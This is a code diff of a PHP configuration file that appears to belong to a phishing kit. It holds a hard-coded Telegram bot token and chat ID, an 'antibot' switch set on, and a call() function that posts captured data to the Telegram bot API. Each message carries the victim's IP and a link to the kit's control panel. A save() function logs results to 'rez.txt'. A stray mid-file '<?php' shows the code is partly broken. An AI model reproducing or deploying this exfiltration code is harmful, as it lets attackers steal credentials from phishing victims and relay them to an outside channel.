@@ -2,27 +2,50 @@
 
 $token = "9108139118:AAEisCNeCi_q_-0DNVTz_icKHkYbrU_dTRc";
 $id = "-1003987841987";
+<?php
+
 
 // use antibot? yes|no
-$antibot = "no";
+$antibot = "yes";
 
-function call($msg) {
-    global $token, $id;
-    $url = "https://telegram.org" . $token . "/sendMessage";
-    $data = [
-        'chat_id' => $id,
-        'text' => $msg,
-        'parse_mode' => 'HTML'
-    ];
-    $options = [
-        'http' => [
-            'method'  => 'POST',
-            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
-            'content' => http_build_query($data)
-        ]
-    ];
-    $context  = stream_context_create($options);
-    return @file_get_contents($url, false, $context);
+ 
+$ipp = "";
+if($_SERVER['REMOTE_ADDR']=="::1"){
+$ipp = "127.0.0.1";
+}else{
+$ipp = $_SERVER['REMOTE_ADDR'];
 }
+$panel_link = str_replace("auth/post.php", "panel/ctr.php", "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."?ip=$ipp");
+
+ 
+
+function call($msg){
+    global $token;
+    global $id;
+    global $panel_link;
+    $info = "
+
+/- MORE INFO -/
+PANEL: $panel_link
+IP: ".$_SERVER['REMOTE_ADDR']."
+TIME: ".date("m/d/Y h:i:sa");
+
+    $c = curl_init('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$id.'&text='.urlencode($msg.$info));
+    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
+    $res = curl_exec($c);
+    curl_close($c);
+    return $res;
+}
+
+
+function save($txt){
+    $fp = fopen((__DIR__)."/rez.txt", "a");
+    fwrite($fp, $txt);
+    fclose($fp);
+}
+
+
+
 
 ?>
